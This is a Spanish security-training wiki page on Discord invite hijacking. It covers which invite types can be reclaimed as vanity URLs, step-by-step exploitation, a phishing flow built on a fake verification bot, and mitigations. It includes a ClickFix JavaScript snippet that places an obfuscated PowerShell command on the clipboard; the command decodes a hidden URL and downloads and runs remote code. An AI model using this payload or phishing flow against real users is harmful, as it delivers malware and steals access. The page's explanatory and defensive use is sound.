# Secuestro de invitaciones de Discord

{{#include ../../banners/hacktricks-training.md}}

La vulnerabilidad del sistema de invitaciones de Discord permite a los threat actors reclamar códigos de invitación expirados o eliminados (temporales, permanentes o vanity custom) como nuevos enlaces vanity en cualquier servidor con Level 3 Boost. Al normalizar todos los códigos a minúsculas, los atacantes pueden pre-registrar códigos de invitación conocidos y secuestrar silenciosamente el tráfico cuando el enlace original expire o el servidor de origen pierda su boost.<sup>[[1]](#references)[[2]](#references)</sup>

## Tipos de invitación y riesgo de secuestro

| Tipo de invitación           | ¿Se puede secuestrar? | Condición / Comentarios                                                                                       |
|-----------------------|-------------|------------------------------------------------------------------------------------------------------------|
| Enlace de invitación temporal | ✅          | Después de expirar, el código queda disponible y puede volver a registrarse como vanity URL por un servidor con boost. |
| Enlace de invitación permanente | ⚠️          | Si se elimina y está compuesto únicamente por letras minúsculas y dígitos, el código puede volver a estar disponible.        |
| Enlace vanity custom    | ✅          | Si el servidor original pierde su Level 3 Boost, su invitación vanity queda disponible para un nuevo registro.    |

## Pasos de explotación

1. Reconocimiento
- Monitoriza fuentes públicas (foros, redes sociales y canales de Telegram) en busca de enlaces de invitación que coincidan con el patrón `discord.gg/{code}` o `discord.com/invite/{code}`.<sup>[[1]](#references)</sup>
- Recopila los códigos de invitación de interés (temporales o vanity).
2. Pre-registro
- Crea o utiliza un servidor de Discord existente con privilegios de Level 3 Boost.
- En **Server Settings → Vanity URL**, intenta asignar el código de invitación objetivo. Si se acepta, el servidor malicioso reserva el código.
3. Activación del secuestro
- Para las invitaciones temporales, espera hasta que la invitación original expire (o elimínala manualmente si controlas el origen).
- Para los códigos que contienen mayúsculas, la variante en minúsculas puede reclamarse inmediatamente, aunque la redirección solo se activa después de la expiración.
4. Redirección silenciosa
- Los usuarios que visiten el enlace antiguo serán enviados sin interrupciones al servidor controlado por el atacante una vez que el secuestro esté activo.

## Phishing Flow mediante un servidor de Discord

1. Restringe los canales del servidor para que solo sea visible un canal **#verify**.<sup>[[1]](#references)</sup>
2. Deploya un bot (por ejemplo, **Safeguard#0786**) para solicitar a los recién llegados que verifiquen mediante OAuth2.
3. El bot redirige a los usuarios a un sitio de phishing (por ejemplo, `captchaguard.me`) bajo la apariencia de un CAPTCHA o un paso de verificación.
4. Implementa el truco de UX **ClickFix**:
- Muestra un mensaje de CAPTCHA roto.
- Guía a los usuarios para abrir el diálogo **Win+R**, pegar un comando de PowerShell precargado y pulsar Enter.

### Ejemplo de inyección en el portapapeles mediante ClickFix
```javascript
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
`$u=($r[-1..-($r.Length)]-join '');` +
`$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
`iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```
Este enfoque evita las descargas directas de archivos y aprovecha elementos de UI familiares para reducir las sospechas del usuario.<sup>[[1]](#references)</sup>

## Mitigaciones

- Usa invite links permanentes que contengan al menos una letra mayúscula o un carácter no alfanumérico (nunca caducan ni se pueden reutilizar).<sup>[[1]](#references)</sup>
- Rota regularmente los códigos de invitación y revoca los links antiguos.
- Supervisa el estado de boost del servidor de Discord y las solicitudes de vanity URL.
- Educa a los usuarios para que verifiquen la autenticidad del servidor y eviten ejecutar comandos pegados desde el clipboard.

## Referencias

- [1] [From Trust to Threat: Hijacked Discord Invites Used for Multi-Stage Malware Delivery](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
- [2] [Custom Invite Link – Discord Support](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)

{{#include ../../banners/hacktricks-training.md}}
